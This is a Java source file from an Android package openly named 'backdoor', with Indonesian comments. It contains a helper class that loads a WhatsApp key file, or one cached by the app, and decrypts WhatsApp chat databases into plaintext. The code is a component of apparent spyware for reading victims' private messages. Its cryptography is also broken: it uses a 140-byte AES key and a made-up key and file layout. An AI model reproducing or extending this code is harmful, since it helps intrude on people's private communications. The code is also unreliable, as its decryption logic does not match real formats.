package com.lazyframework.backdoor;

import android.util.Base64;
import android.util.Log;
import java.io.*;
import android.content.Context;
import java.security.spec.KeySpec;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import java.util.zip.GZIPInputStream;

public class WhatsAppDecryptHelper {
    private static final String TAG = "LazyFramework";
    
    /**
     * Mendekripsi database WhatsApp menggunakan key file
     * @param keyData File key (158 bytes)
     * @param encryptedPath Path file database (.crypt12/.crypt14/.crypt15)
     * @param outputPath Path output untuk hasil dekripsi
     */
    public static boolean decryptDatabase(byte[] keyData, String encryptedPath, String outputPath) {
        try {
            Log.d(TAG, "🔓 Decrypting WhatsApp database...");
            
            // Validasi key
            if (keyData == null || keyData.length < 158) {
                Log.e(TAG, "❌ Invalid key data");
                return false;
            }
            
            // Ekstrak informasi dari key
            // Key format: [16 bytes IV][140 bytes AES key][2 bytes checksum]
            byte[] iv = new byte[16];
            byte[] aesKey = new byte[140];
            
            System.arraycopy(keyData, 0, iv, 0, 16);
            System.arraycopy(keyData, 16, aesKey, 0, 140);
            
            // Baca file terenkripsi
            File encryptedFile = new File(encryptedPath);
            if (!encryptedFile.exists()) {
                Log.e(TAG, "❌ File not found: " + encryptedPath);
                return false;
            }
            
            byte[] encryptedData = new byte[(int) encryptedFile.length()];
            FileInputStream fis = new FileInputStream(encryptedFile);
            fis.read(encryptedData);
            fis.close();
            
            // Cek apakah file adalah crypt12/crypt14/crypt15
            // Format: [16 bytes IV][encrypted data]
            byte[] fileIv = new byte[16];
            byte[] fileData = new byte[encryptedData.length - 16];
            System.arraycopy(encryptedData, 0, fileIv, 0, 16);
            System.arraycopy(encryptedData, 16, fileData, 0, encryptedData.length - 16);
            
            // Inisialisasi AES Cipher
            SecretKeySpec secretKey = new SecretKeySpec(aesKey, "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(fileIv);
            
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, secretKey, ivSpec);
            
            // Dekripsi data
            byte[] decryptedData = cipher.doFinal(fileData);
            
            // Data terdekripsi adalah GZIP compressed
            // Extract GZIP
            ByteArrayInputStream bais = new ByteArrayInputStream(decryptedData);
            GZIPInputStream gzip = new GZIPInputStream(bais);
            
            // Tulis ke output
            FileOutputStream fos = new FileOutputStream(outputPath);
            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = gzip.read(buffer)) != -1) {
                fos.write(buffer, 0, bytesRead);
            }
            fos.close();
            
            Log.d(TAG, "✅ Database decrypted successfully: " + outputPath);
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Decrypt error: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Mendekripsi menggunakan key yang sudah di-cache
     */
    public static boolean decryptWithCachedKey(Context context, String encryptedPath, String outputPath) {
        try {
            File cacheFile = new File(context.getCacheDir(), "whatsapp_key.key");
            if (!cacheFile.exists()) {
                Log.e(TAG, "❌ Cached key not found");
                return false;
            }
            
            FileInputStream fis = new FileInputStream(cacheFile);
            byte[] keyData = new byte[(int) cacheFile.length()];
            fis.read(keyData);
            fis.close();
            
            return decryptDatabase(keyData, encryptedPath, outputPath);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Cache decrypt error: " + e.getMessage());
            return false;
        }
    }
}
